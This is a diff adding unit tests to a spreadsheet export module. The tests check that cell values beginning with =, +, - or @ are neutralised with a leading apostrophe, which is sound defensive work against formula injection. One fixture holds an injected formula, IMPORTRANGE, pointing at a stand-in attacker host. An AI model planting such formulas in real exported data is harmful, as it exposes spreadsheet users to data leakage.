@@ -445,6 +445,35 @@ test('toSheetValues emits just the header when the result is empty', () => {
   ]);
 });
 
+// saiku#2550i: a caption or formatted value starting with =, +, - or @ would be
+// EVALUATED as a formula in the user's sheet on setValues. toSheetValues neutralises
+// them with a leading apostrophe (text-forcing, display-unchanged).
+test('toSheetValues neutralises formula-leading captions and values', () => {
+  const response = {
+    metadata: {
+      rows: [{ caption: '=IMPORTRANGE("https://evil.example", "A1")' }],
+      columns: [{ caption: '+SUM(A1:A9)' }, { caption: '@import' }],
+    },
+    data: [{
+      '=IMPORTRANGE("https://evil.example", "A1")': {
+        value: null,
+        formatted: '-A1+SUM(B:B)',
+      },
+    }],
+  };
+  assert.deepStrictEqual(SaikuQueryModel.toSheetValues(response, { asNumbers: false }), [
+    ["'=IMPORTRANGE(\"https://evil.example\", \"A1\")", "'+SUM(A1:A9)", "'@import"],
+    ["'-A1+SUM(B:B)", '', ''],
+  ]);
+});
+
+test('neutralise leaves numbers, blank and benign strings alone', () => {
+  assert.strictEqual(SaikuQueryModel.neutralise(42), 42);
+  assert.strictEqual(SaikuQueryModel.neutralise(''), '');
+  assert.strictEqual(SaikuQueryModel.neutralise('Food'), 'Food');
+  assert.strictEqual(SaikuQueryModel.neutralise('a-b-c'), 'a-b-c');
+});
+
 // ---------------------------------------------------------------------------
 // SaikuQueryModel — write planning (refresh semantics)
 // ---------------------------------------------------------------------------
